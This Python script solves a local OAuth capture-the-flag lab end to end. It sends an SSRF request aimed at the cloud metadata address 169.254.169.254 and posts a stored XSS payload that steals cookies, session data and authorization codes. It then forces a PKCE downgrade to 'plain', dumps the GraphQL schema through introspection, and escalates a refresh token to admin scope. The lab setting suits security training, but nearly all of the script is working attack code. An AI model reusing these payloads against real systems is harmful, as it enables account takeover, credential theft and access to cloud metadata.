#!/usr/bin/env python3
"""Test script that completes the entire CTF"""
import requests
import json
import time
import jwt
import base64

BASE_URL = "http://localhost:5000"

def solve_ctf():
    print("🎯 Starting OAuth CTF Challenge Solution")
    print("=" * 50)

    # Stage 1: SSRF
    print("\n[*] Stage 1: Registering client with SSRF...")
    resp = requests.post(f"{BASE_URL}/auth/register", json={
        "client_name": "test_solver",
        "logo_uri": "http://169.254.169.254/latest/meta-data/",
        "redirect_uris": ["http://localhost:3000/callback"]
    })

    if resp.status_code != 200:
        print(f"❌ Stage 1 failed: {resp.text}")
        return

    client_data = resp.json()
    client_id = client_data['client_id']
    client_secret = client_data['client_secret']

    print(f"✅ Client registered: {client_id}")
    if 'flag' in client_data:
        print(f"🚩 Stage 1 Flag: {client_data['flag']}")

    # Check progress
    progress_resp = requests.get(f"{BASE_URL}/progress/{client_id}")
    if progress_resp.status_code == 200:
        progress = progress_resp.json()
        print(f"📊 Progress: {progress['completed_stages']}/5 stages complete")

    # Stage 2: Self-Contained XSS
    print("\n[*] Stage 2: Posting self-contained XSS payload to guestbook...")
    xss_payload = f'<script>fetch("/capture",{{method:"POST",headers:{{"Content-Type":"application/json"}},body:JSON.stringify({{client_id:"{client_id}",data:document.getElementById("admin-session-data")?.innerText,cookies:document.cookie,auth_code:document.getElementById("auth-code")?.innerText}})}});</script>'

    resp = requests.post(f"{BASE_URL}/app/guestbook", json={
        "author": "test_solver",
        "message": xss_payload,
        "client_id": client_id
    })

    if resp.status_code == 200:
        print("✅ XSS payload posted")
    else:
        print(f"❌ Stage 2 failed: {resp.text}")

    # Simulate admin bot visit
    print("\n[*] Simulating admin bot visit...")
    admin_visit_resp = requests.get(f"{BASE_URL}/admin/simulate-visit/{client_id}")

    if admin_visit_resp.status_code == 200:
        admin_result = admin_visit_resp.json()
        print(f"✅ Admin bot visited with auth code: {admin_result.get('auth_code', '')[:20]}...")
        if admin_result.get('xss_executed'):
            print("✅ XSS payload executed by admin bot")
            if 'flag' in admin_result:
                print(f"🚩 Stage 2 Flag: {admin_result['flag']}")

        # Get the auth code for next stage
        auth_code = admin_result.get('auth_code')
        if not auth_code:
            print("❌ Could not get authorization code from admin visit")
            return

    # Check captured data
    print("\n[*] Checking captured XSS data...")
    capture_resp = requests.get(f"{BASE_URL}/check-capture/{client_id}")
    if capture_resp.status_code == 200:
        capture_result = capture_resp.json()
        if capture_result.get('status') == 'captured':
            print("✅ XSS data successfully captured!")
            if 'flag' in capture_result:
                print(f"🚩 Stage 2 Flag (confirmed): {capture_result['flag']}")
        else:
            print("⚠️ No XSS data captured yet")
    else:
        print(f"❌ Could not check capture: {capture_resp.text}")

    # Stage 3: PKCE Bypass
    print("\n[*] Stage 3: Performing PKCE downgrade attack...")
    token_resp = requests.post(f"{BASE_URL}/token/exchange", json={
        "client_id": client_id,
        "client_secret": client_secret,
        "code": auth_code,
        "code_challenge_method": "plain"  # Downgrade from S256 to plain
    })

    if token_resp.status_code == 200:
        token_data = token_resp.json()
        access_token = token_data['access_token']
        refresh_token = token_data['refresh_token']
        print("✅ PKCE downgrade successful")
        if 'flag' in token_data:
            print(f"🚩 Stage 3 Flag: {token_data['flag']}")
    else:
        print(f"❌ Stage 3 failed: {token_resp.text}")
        return

    # Stage 4: GraphQL Introspection
    print("\n[*] Stage 4: Performing GraphQL introspection...")
    graphql_query = {
        "query": """
        {
            __schema {
                types {
                    name
                    fields {
                        name
                        type { name }
                    }
                }
            }
        }
        """
    }

    headers = {"Authorization": f"Bearer {access_token}"}
    graphql_resp = requests.post(f"{BASE_URL}/graphql",
                                json=graphql_query,
                                headers=headers)

    if graphql_resp.status_code == 200:
        result = graphql_resp.json()
        print("✅ GraphQL introspection successful")
        if 'flag' in result:
            print(f"🚩 Stage 4 Flag: {result['flag']}")

        # Look for AdminSecret type
        schema_types = result.get('data', {}).get('__schema', {}).get('types', [])
        admin_secret_found = any(t.get('name') == 'AdminSecret' for t in schema_types)
        if admin_secret_found:
            print("🔍 Found AdminSecret type in schema")
    else:
        print(f"❌ Stage 4 failed: {graphql_resp.text}")
        return

    # Stage 5: Scope Escalation
    print("\n[*] Stage 5: Performing scope escalation...")
    refresh_resp = requests.post(f"{BASE_URL}/token/refresh", json={
        "refresh_token": refresh_token,
        "scope": "ADMIN_SECRETS"  # Escalate to admin scope
    })

    if refresh_resp.status_code == 200:
        refresh_data = refresh_resp.json()
        admin_token = refresh_data['access_token']
        print("✅ Scope escalation successful")
        if 'flag' in refresh_data:
            print(f"🚩 Stage 5 Flag: {refresh_data['flag']}")

        # Test admin access
        print("\n[*] Testing admin access...")
        admin_headers = {"Authorization": f"Bearer {admin_token}"}

        # Try to access admin secrets via GraphQL
        admin_query = {
            "query": """
            {
                adminSecrets {
                    id
                    value
                    scope_required
                }
            }
            """
        }

        admin_resp = requests.post(f"{BASE_URL}/graphql",
                                  json=admin_query,
                                  headers=admin_headers)

        if admin_resp.status_code == 200:
            admin_result = admin_resp.json()
            print("✅ Admin GraphQL access successful")
            secrets = admin_result.get('data', {}).get('adminSecrets', [])
            if secrets:
                print(f"🔐 Retrieved {len(secrets)} admin secrets")

    else:
        print(f"❌ Stage 5 failed: {refresh_resp.text}")
        return

    # Final progress check
    print("\n" + "=" * 50)
    print("🎉 CTF Challenge Completed!")

    final_progress = requests.get(f"{BASE_URL}/progress/{client_id}")
    if final_progress.status_code == 200:
        progress = final_progress.json()
        print(f"📊 Final Progress: {progress['completed_stages']}/5 stages complete")

        if progress['completed_stages'] == 5:
            print("🏆 All stages completed successfully!")
            print(f"🎯 Client ID: {client_id}")

            # Decode and display token info
            try:
                token_payload = jwt.decode(admin_token, options={"verify_signature": False})
                print(f"🔐 Final scope: {token_payload.get('scope', 'N/A')}")
            except:
                pass

    print("\n🎊 Congratulations! You've mastered the OAuth attack chain!")

def test_individual_stages():
    """Test individual stages for debugging"""
    print("🧪 Testing individual stages...")

    # Health check
    health = requests.get(f"{BASE_URL}/health")
    if health.status_code == 200:
        print("✅ Server is healthy")
    else:
        print("❌ Server health check failed")
        return

    # Test SSRF endpoint
    print("\n[*] Testing SSRF endpoint...")
    ssrf_test = requests.post(f"{BASE_URL}/auth/register", json={
        "client_name": "ssrf_test",
        "logo_uri": "https://httpbin.org/get"
    })

    if ssrf_test.status_code == 200:
        print("✅ SSRF endpoint responsive")
        result = ssrf_test.json()
        if 'ssrf_result' in result:
            print("✅ SSRF result returned")
    else:
        print(f"❌ SSRF test failed: {ssrf_test.text}")

if __name__ == "__main__":
    import sys

    if len(sys.argv) > 1 and sys.argv[1] == "test":
        test_individual_stages()
    else:
        solve_ctf()